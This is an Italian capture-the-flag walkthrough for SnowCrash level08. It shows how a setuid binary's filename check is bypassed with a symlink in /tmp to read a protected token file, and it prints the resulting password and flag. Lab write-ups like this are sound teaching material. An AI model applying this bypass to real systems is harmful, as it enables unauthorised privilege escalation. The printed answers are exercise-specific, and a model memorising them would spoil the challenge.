# Level08
### 1 passaggio:
Eseguendo il comando `ls -l`:
```bash
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```
Abbiamo un eseguibile che stampa il contenuto di tutti i file tranne il file token,
analizzando con il comando:
```bash
strings level08
```
notiamo che è chiaramente scritto il nome `token` e subito sotto `You may not access '%s'`
in effetti creando un file chiamato token in /tmp l'eseguibile lo rifiuta proprio come il file
token originale, altro indizio è la funzione `strstr` visibile dal comando `strings`, usata
molto probabilmente per controllare il nome del file passatogli come argomento

### 2 passaggio:
Dunque ora basta creare un collegamento nella cartella /tmp che porta al file originale token
chiamandolo con un altro nome e poi passarlo all'eseguibile
```bash
ln -s ~/token /tmp/flag
./level08 /tmp/flag
```
e ora abbiamo il seguente output:
```bash
quif5eloekouj29ke0vouxean
```
Ovvero la password per accedere a flag08, quindi:
```bash
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
